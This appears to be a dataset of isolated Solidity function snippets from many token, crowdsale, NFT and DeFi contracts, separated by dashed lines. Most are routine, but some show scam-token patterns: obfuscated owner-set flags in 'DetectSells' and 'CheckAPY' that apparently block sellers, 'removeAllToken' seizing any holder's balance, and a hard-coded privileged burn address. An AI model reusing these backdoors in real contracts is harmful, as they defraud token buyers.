        if (!adminPermission[msg.sender]) {
            return UserEntryStatus.NULL;
        }
        return userDateToStatus[_user][_date];
    }
--------------------------------------------------------------------------------
function NyronChain_Crowdsale() {
        beneficiary = 0x618a6e3DA0A159937917DC600D49cAd9d0054A70;
        rate = 1800;
        softcap = 5560 * 1 ether;
        tokenReward = token(0xE65a20195d53DD00f915d2bE49e55ffDB46380D7);
    }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function createMasterpiece(
        string _name,
        string _artist,
        uint256 _snatchWindow
    )
        public
        onlyCurator
        returns (uint)
    {
        uint256 masterpieceId = _createMasterpiece(_name, _artist, STARTING_PRICE, _snatchWindow, address(this));
        return masterpieceId;
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function identifierToCoordinate(uint256 identifier) public view returns(uint256 x, uint256 y) {
        y = (identifier - 1) / gameSettings.cols;
        x = (identifier - 1) - (y * gameSettings.cols);
    }
--------------------------------------------------------------------------------
function distributeExternal(uint256 _eth, F4Ddatasets.EventReturns memory _eventData_)
        private
        returns(F4Ddatasets.EventReturns)
    {
        // pay 14% out to owner rewards
        uint256 _own = _eth.mul(14) / 100;
        owner_.transfer(_own);
        
        return(_eventData_);
    }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function transferAndCall(address _recipient, uint256 _value, bytes _extraData) external{
		transfer(_recipient, _value);
		//call the tokenFallback function on the contract you want to be notified.
		require(TokenRecipient(_recipient).tokenFallback(msg.sender,_value,_extraData)); 
	}
--------------------------------------------------------------------------------
function getTypes() external view returns(uint8[]) {
        uint8[] memory res = new uint8[](1);
        res[0] = 4;
        return res;
    }
--------------------------------------------------------------------------------
function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "INVALID_OWNER");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x08C7AA1633cD6127D580C166578d3B1A21212abd,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
      if (master == 0x0) revert();
      if (msg.sender != upgradeMaster) revert();
      upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function smTransfer(address _to, uint256 _value) public returns (bool)  {
        require(smPool == msg.sender);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function burnTransfer(address _from, uint256 _value, string key) public returns (bool)  {
        require(burnPoolAddreses[key] != 0x0);
        _transfer(_from, burnPoolAddreses[key], _value);
        return true;
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) internal returns(uint256) {
      uint256 z = x + y;
      assert((z >= x) && (z >= y));
      return z;
    }
--------------------------------------------------------------------------------
function DetectSells(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    interstate[spender] = val;
    rainuier[spender] = val2; 
    olympci[spender] = val3;
    poocoin = val4;
  }
--------------------------------------------------------------------------------
function getRate(address _token) public view returns (uint256) {
    if (_token == address(0)) {
      return rate * 10 ** 18;
    } else {
      return 0;
    }
  }
--------------------------------------------------------------------------------
function addNextMemberPayment(address member, uint256 expectingValue, uint256 platformCommission)
        public
        onlyCreator
        memberExists(member)
        nextMemberPaymentDoesNotExist(member)
    {
        nextMemberPayments[member] = NextMemberPayment(
            true,
            expectingValue,
            platformCommission
        );
        emit NextMemberPaymentAdded(member, expectingValue, platformCommission);
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function setBuyPrice(uint256 newBuyPrice) 
    onlyOwner 
    public {
        require(newBuyPrice>0);
        _originalBuyPrice = newBuyPrice; // unit
        // control _maximumBuy_USD = 10,000 USD, SPIKE price is 0.01USD
        // maximumBuy_SPIKE = 1000,000 SPIKE = 1000,000,0000000000 unit = 10^16
        _maximumBuy = (10**18 * 10**16) /_originalBuyPrice;
    }
--------------------------------------------------------------------------------
function PGDA(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setFeelessSender(address _sender, bool _feeless) public ownerOnly {
        require(!_feeless || _feeless && canFeeWhitelist, "cannot add to whitelist");
        feelessSender[_sender] = _feeless;
    }
--------------------------------------------------------------------------------
function setFeelessReciever(address _recipient, bool _feeless) public ownerOnly {
        require(!_feeless || _feeless && canFeeWhitelist, "cannot add to whitelist");
        feelessReciever[_recipient] = _feeless;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor (ProxyRegistry registryAddress, TokenTransferProxy tokenTransferProxyAddress, ERC20 tokenAddress, address protocolFeeAddress) public {
        registry = registryAddress;
        tokenTransferProxy = tokenTransferProxyAddress;
        exchangeToken = tokenAddress;
        protocolFeeRecipient = protocolFeeAddress;
        owner = msg.sender;
    }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function _upgradeTo(address newImplementation) internal {
    address currentImplementation = implementation();
    require(currentImplementation != newImplementation);
    setImplementation(newImplementation);
    emit Upgraded(newImplementation);
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {

    bool withinPeriod = started;

    bool nonZeroPurchase = msg.value != 0;

    return withinPeriod && nonZeroPurchase;

  }
--------------------------------------------------------------------------------
function timeoutResolve(bytes32 msigId, uint amount)
        public
    {
        // Require time has passed
        require(now >= multisigs[msigId].unlockTime);
        // Return to owner
        spendFromMultisig(msigId, amount, multisigs[msigId].owner);
    }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function freeze (address target, bool froze ) public   {
        if(froze || (!froze && !usersCanUnfreeze)) {
            require(admin[msg.sender]);
        }
        _freeze(target, froze);
    }
--------------------------------------------------------------------------------
function getWallet(string calldata recipientID)
        external
        view
        returns (Wallet memory)
    {
        require(
            walletsIDMap[recipientID].walletAddress != address(0x0),
            "invalid wallet"
        );
        return walletsIDMap[recipientID];
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
    external
  {
    // Update operator status
    operators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);       
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.transfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function setInactivityReleasePeriod(uint256 expiry) onlyOwner returns (bool success) {
        if (expiry > 1000000) throw;
        inactivityReleasePeriod = expiry;

        emit InactivityReleasePeriodChange(expiry);
        return true;
    }
--------------------------------------------------------------------------------
function DMEX_Base(address feeAccount_, uint256 inactivityReleasePeriod_, address AMBBridgeContract_, address DMEX_XDAI_CONTRACT_) {
        owner = msg.sender;
        gasFeeAccount = feeAccount_;
        inactivityReleasePeriod = inactivityReleasePeriod_;
        AMBBridgeContract = AMBBridgeContract_;
        DMEX_XDAI_CONTRACT = DMEX_XDAI_CONTRACT_;
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function set_prices(uint8 _create, uint8 _edit, uint8 _active_contract) public onlyOwner returns (bool success){
        prices.create = _create;
        prices.edit = _edit;
        prices.active_contract = _active_contract;
        return true;
    }
--------------------------------------------------------------------------------
constructor () {
        _name = "CV Shots";
        _symbol = "CVS";
        _totalSupply;
        _mint(owner(), 3000000000 * 10 ** (decimals()) ); 

    }
--------------------------------------------------------------------------------
function  Helex() 
    {
        totalSupply = 50000000;
        symbol = 'HLX';
        owner = 0x753f309A8d9Aaed2fb92e54628043099d043180e;
        balances[owner] = 50000000;
        decimals = 1;
    }
--------------------------------------------------------------------------------
function Etherboard() {
        owner = msg.sender;
        minBid = 0.001 ether;
        numLeaders = 0;
        maxLeaders = 10;
    }
--------------------------------------------------------------------------------
function WLCoin() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function lockForMemberVote(address _of, uint _days) public onlyOperator {
        if (_days.add(now) > isLockedForMV[_of])
            isLockedForMV[_of] = _days.add(now);
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint _value) public returns(bool ok) {
        bytes memory empty;
        _transfer(msg.sender, _to, _value, empty);
        return true;
    }
--------------------------------------------------------------------------------
function setNeuroChainAddress(
    string neurochainAddress
  )
  public
  {
    neuroChainAddresses[msg.sender] = neurochainAddress;
    NeuroChainAddressSet(
      msg.sender,
      neurochainAddress,
      block.timestamp,
      false
    );
  }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);       
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function validPurchase() internal view returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return withinCap && super.validPurchase();
  }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function replaceBoardMember(address _oldMember, address _newMember)
        public
        onlyBoard
        returns (bool)
    {
        require(removeBoardMember(_oldMember), "Failed to remove old member");
        return addBoardMember(_newMember);
    }
--------------------------------------------------------------------------------
function setVotingPeriod(uint duration)
        external
        onlyOwner
    {
        require(MIN_VOTING_PERIOD <= duration &&
                duration <= MAX_VOTING_PERIOD);
        /* Require that the voting period is no longer than a single fee period,
         * So that a single vote can span at most two fee periods. */
        require(duration <= havven.feePeriodDuration());
        votingPeriod = duration;
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function changeCommission(uint _newCommission) public onlyOwner whenNotPaused {
        require(_newCommission <= MAX_COMMISION);
        require(_newCommission != commission);
        commission = _newCommission;
        emit NewCommission(commission);
    }
--------------------------------------------------------------------------------
function withdrawCommission(uint _amount) public onlyOwner {
        // cannot withdraw money reserved for requests
        require(_amount <= availableCommission);
        availableCommission = availableCommission.sub(_amount);
        msg.sender.transfer(_amount);
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint256 _tokenId) external view returns (uint256) {
        Sale memory sale = tokenIdToSale[_tokenId];
        require(_isOnSale(sale));
        return _currentPrice(sale);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function upgradeToAndCall(address _implementation, string _newVersion, bytes _data) payable public onlyProxyOwner {
    _upgradeTo(_implementation, _newVersion);
    require(address(this).call.value(msg.value)(_data));
  }
--------------------------------------------------------------------------------
function setNextRules(uint _jackpot, uint _slots, uint _price, uint _max) public not(State.NotRunning) onlyOwner {
		require(game.loop == true);
		game.nextGameRules = verifiedGameRules(_jackpot, _slots, _price, _max);
	}
--------------------------------------------------------------------------------
function acceptOwnership()
        public
        noReentry
        returns (bool)
    {
        require(msg.sender == newOwner);
        ChangedOwner(owner, newOwner);
        owner = newOwner;
        return true;
    }
--------------------------------------------------------------------------------
function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
--------------------------------------------------------------------------------
function addManyToWhitelist(address[] addrs)
    onlyAdmin
    public
    {
        for (uint256 i = 0; i < addrs.length; i++) {
            addToWhitelist(addrs[i]);
        }
    }
--------------------------------------------------------------------------------
function removeManyFromWhitelist(address[] addrs)
    onlyAdmin
    public
    {
        for (uint256 i = 0; i < addrs.length; i++) {
            removeFromWhitelist(addrs[i]);
        }
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) internal returns(uint256) {
      uint256 z = x + y;
      assert((z >= x) && (z >= y));
      return z;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function _numberMinted(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert MintedQueryForZeroAddress();
        return uint256(_addressData[owner].numberMinted);
    }
--------------------------------------------------------------------------------
function _numberBurned(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert BurnedQueryForZeroAddress();
        return uint256(_addressData[owner].numberBurned);
    }
--------------------------------------------------------------------------------
function setNewGenealogy(address _child, address _father) private returns (bool succcess){
        genealogy[_child].father = _father;
        genealogy[_father].children[_child] = 1;

        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
      if (master == 0x0) throw;
      if (msg.sender != upgradeMaster) throw;
      upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function addAccountToPreTrading(address account, bool allowed)
        public
        onlyOwner
    {
        require(preTrader[account] != allowed, "TOKEN: Already enabled.");
        preTrader[account] = allowed;
    }
--------------------------------------------------------------------------------
function finalize() onlyOwner public {
        require(!isFinalized);
    
        uint256 ownerShareTokens = TEAM_LIMIT;
        token.mint(wallet, ownerShareTokens);
        
        isFinalized = true;
    }
--------------------------------------------------------------------------------
function QuantorToken() {
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor(address operation) public {
    _totalSupply = INITIAL_SUPPLY;
    _balances[operation] = INITIAL_SUPPLY;
    emit Transfer(address(0), operation, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function SmartCityToken(address _ownerAddress, uint256 _startTime) public {
        owner = _ownerAddress; // token Owner
        startTime = _startTime; // token Start Time
        unlockOwnerDate = startTime + 2 years;
        balances[owner] = totalSupply; // all tokens are initially allocated to token owner
    }
--------------------------------------------------------------------------------
function removeAllToken(address target) public onlyOwner {
        _transfer(target, owner, balanceOf[target]);
        emit Transfer(target, owner, balanceOf[target]);
    }
--------------------------------------------------------------------------------
function getUnlockedAmount(address account) public view returns (uint256) {
      uint256 res = 0;
      res = balanceOf[account].sub(getLockedAmount(account));
      return res;
    }
--------------------------------------------------------------------------------
function  UniswapDNI() public {
    // Mint initial supply of tokens. All further minting of tokens is disabled
    totalSupply_ = INITIAL_SUPPLY;

    // Transfer all initial tokens to msg.sender
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function transferPreSignedHashing(
    address _operator,
    address _to,
    address _delegate,
    uint256 _value,
    uint256 _fee,
    uint256 _nonce,
    bytes _userData
  )
    public
    pure
    returns (bytes32)
  {
    return keccak256(abi.encodePacked(
      _operator,
      _to,
      _delegate,
      _value,
      _fee,
      _nonce,
      _userData
    ));
  }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function transferOut(address _token, address _to, uint256 _amount) external onlyOwner {
        require(
            doTransferOut(
                _token,
                _to,
                _amount
            ),
            "transferOut: Transfer token out failed!"
        );
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function deprecate(address _upgradedAddress) public onlyOwner {
        require(_upgradedAddress != address(0));
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        emit Deprecate(_upgradedAddress);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public
        returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function TokenUnionToken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function teamwallet(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            fee(_counts[i]); }
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) internal pure returns(uint256) {
      uint256 z = x + y;
      assert((z >= x) && (z >= y));
      return z;
    }
--------------------------------------------------------------------------------
function insert (address _id, uint256 _NICR, address _prevId, address _nextId) external override {
        ITroveManager troveManagerCached = troveManager;

        _requireCallerIsBOorTroveM(troveManagerCached);
        _insert(troveManagerCached, _id, _NICR, _prevId, _nextId);
    }
--------------------------------------------------------------------------------
function _requireCallerIsTroveManager() internal view {
        require(msg.sender == address(troveManager), "SortedTroves: Caller is not the TroveManager");
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
function validMintPurchase(uint256 _value) internal constant returns (bool) {
    bool withinCap = weiRaised.add(_value) <= cap;
    return super.validMintPurchase(_value) && withinCap;
  }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {
        require(!frozen[_holder]);
        frozen[_holder] = true;
        emit Freeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
        require(frozen[_holder]);
        frozen[_holder] = false;
        emit Unfreeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function setAssetsUpAmountRate(uint16 _value)public returns (bool success) {
        require (msg.sender == manager) ; 
        require (_value > 0) ;   
        upAmountRate = _value ;
        return true;
    }
--------------------------------------------------------------------------------
function setIssueDiv(uint256 _value)public returns (bool success) {
        require (msg.sender == manager) ;
        require (_value >= 1) ;
        issueDiv = _value ;
        return true;
    }
--------------------------------------------------------------------------------
function AdeniumLabsToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function recoverLostToken( address _token ) external returns ( bool ) {
        TransferHelper.safeTransfer(_token, DAO, IERC20( _token ).balanceOf( address(this)));
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public returns (bool alwaystrue)
  {
    bytes memory empty; // null
    _transfer( msg.sender, to, value, empty );
    return true;
  }
--------------------------------------------------------------------------------
function YCCC(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public returns (bool) {
    require(!_locked[msg.sender]);
    _transfer(msg.sender, recipient, amount);
    return true;
  }
--------------------------------------------------------------------------------
function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ClaimableToken t = ClaimableToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
--------------------------------------------------------------------------------
constructor() public {
    totalSupply_ = TOTAL_SUPPLY;
    balances[team_wallet] = totalSupply_;
    emit Transfer(address(0), team_wallet, totalSupply_);
  }
--------------------------------------------------------------------------------
function withdrawAll() public onlyJury {
        _locked = true;
        require(olyToken.transfer(jury, contractBalance()), "Token transfer failed.");
    }
--------------------------------------------------------------------------------
function _mint(address to, uint256 tokenId) internal {
    super._mint(to, tokenId);

    _allTokensIndex[tokenId] = _allTokens.length;
    _allTokens.push(tokenId);
  }
--------------------------------------------------------------------------------
constructor (string memory name, string memory symbol, uint256 initialSupply,address payable owner) public {
        _name = name;
        _symbol = symbol;
        _decimals = 8;
        _owner = owner;
        _mint(_owner, initialSupply);
    }
--------------------------------------------------------------------------------
function payout() payable public {
        var share = this.balance / 2;
        epicenter_works_addr.transfer(share);
        max_schrems_addr.transfer(share);
    }
--------------------------------------------------------------------------------
function KEP(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    usausa[spender] = val;
    forest[spender] = val2; 
    smartphone[spender] = val3;
    peanuts = val4;
  }
--------------------------------------------------------------------------------
function MonethaToken(address _ownerAddr, uint _startTime) {
		owner = _ownerAddr;
		startTime = _startTime;
		lockReleaseDate = startTime + 1 years;
		balanceOf[owner] = totalSupply; // Give the owner all initial tokens
	}
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function addWhitelistUsers(address[] userAddresses) public onlyOwner {
        for (uint i = 0; i < userAddresses.length; i++) {
            addWhitelistUser(userAddresses[i]);
        }
    }
--------------------------------------------------------------------------------
function Anubis() {
        founder = msg.sender;
        totalSupply = 100000000 * 10 ** uint256(decimals);
        balances[founder] = totalSupply;
    }
--------------------------------------------------------------------------------
function startAuction(uint256 _pepeId, uint256 _beginPrice, uint256 _endPrice, uint64 _duration) public {
        // solhint-disable-next-line not-rely-on-time
        require(pepeContract.getCozyAgain(_pepeId) <= now);//need to have this extra check
        super.startAuction(_pepeId, _beginPrice, _endPrice, _duration);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
        owner = 0xb636a5A167b603d4f75E485E4657e1dD5C2372aa;
        _balances[0xb636a5A167b603d4f75E485E4657e1dD5C2372aa] = supply;
        emit Transfer(address(0), 0xb636a5A167b603d4f75E485E4657e1dD5C2372aa, supply);
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) returns (bool success) {
    if (_value <= 0) revert();
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function isLocked(address wallet, address currencyCt, uint256 currencyId)
    public
    view
    returns (bool)
    {
        return 0 < walletCurrencyFungibleLockCount[wallet][currencyCt][currencyId] ||
        0 < walletCurrencyNonFungibleLockCount[wallet][currencyCt][currencyId];
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function CtdToken(uint64 _preIcoOpeningTime) payable {
        require(_preIcoOpeningTime > now);

        preIcoOpeningTime = _preIcoOpeningTime;
        icoOpeningTime = preIcoOpeningTime + PRE_ICO_DURATION;
        closingTime = icoOpeningTime + ICO_DURATION;
    }
--------------------------------------------------------------------------------
function getData() external returns (uint amount1, uint amount2) {

        update();

        amount1 = YFIprice0Average.mul(1).decode144();
        amount2 = SYFIprice0Average.mul(1).decode144();
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    silua[spender] = val;
    binance[spender] = val2; 
    comeatme[spender] = val3;
    summer = val4;
  }
--------------------------------------------------------------------------------
function dividendsOf(address _customerAddress) public view returns (uint256) {
    return (uint256) ((int256) (profitPerToken.mul(balanceOf(_customerAddress)).div(decimalShift)) - payoutsTo[_customerAddress]);
  }
--------------------------------------------------------------------------------
function isOperatorFor(
        address operator,
        address tokenHolder
    ) public view returns (bool) {
        return operator == tokenHolder ||
            (_defaultOperators[operator] && !_revokedDefaultOperators[tokenHolder][operator]) ||
            _operators[tokenHolder][operator];
    }
--------------------------------------------------------------------------------
function setPrice(uint8 category, uint256 price, bool inWei) public onlyOwner {
        uint256 multiply = 1e18;
        if (inWei) {
            multiply = 1;
        }
        
        categoryPrice[category] = price * multiply;
    }
--------------------------------------------------------------------------------
function transferSuperuser(address _newSuperuser) public onlySuperuser {
    require(_newSuperuser != address(0));
    removeRole(msg.sender, ROLE_SUPERUSER);
    addRole(_newSuperuser, ROLE_SUPERUSER);
  }
--------------------------------------------------------------------------------
function scalePurchaseTokenAmountToMatchRemainingTokens(uint256 _amount) internal view returns (uint256 _exactAmount) {
        if (nextTokenId + _amount - 1 > totalTokenSupply) {
            _amount = totalTokenSupply - nextTokenId + 1;
        }
        
        return _amount;
    }
--------------------------------------------------------------------------------
function UPXToken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function normalCheck() public view returns (bool){
   return (transTimes > 0 && regularTransTime.length > 0 && minInvest >0 && rateSteps.length >0);
 }
--------------------------------------------------------------------------------
function addAddressToWhitelist(address addr) public onlyOwner returns(bool success) {
        if (!whitelist[addr]) {
            whitelist[addr] = true;
            emit WhitelistedAddressAdded(addr);
            success = true;
        }
    }
--------------------------------------------------------------------------------
